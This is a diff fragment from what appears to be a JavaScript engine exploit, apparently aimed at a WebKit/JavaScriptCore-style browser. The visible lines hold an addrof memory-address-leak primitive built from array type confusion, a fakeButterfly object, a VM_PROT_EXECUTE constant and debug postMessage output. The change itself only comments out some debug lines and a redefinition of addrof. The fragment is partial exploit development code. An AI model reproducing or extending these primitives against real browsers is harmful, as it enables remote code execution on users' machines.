@@ -498,7 +498,7 @@ var VM_PROT_EXECUTE = 0x4
               fakeButterfly: a0
             };
             let addr = addrof(obj);
-            port.postMessage("obj @ " + addr.toString());
+            /*port.postMessage("obj @ " + addr.toString());
             port.postMessage("arr @ " + addrof([]).toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
            
@@ -528,7 +528,7 @@ var VM_PROT_EXECUTE = 0x4
             addrof = (val) => {
               b1[0] = val;
               return new Int64.fromDouble(a1[0]);
-            }
+            }*/
             port.postMessage("debug addrof of {}" + addrof({}))
             //port.postMessage("obj addr@ " + addrof(""))
               //gc();
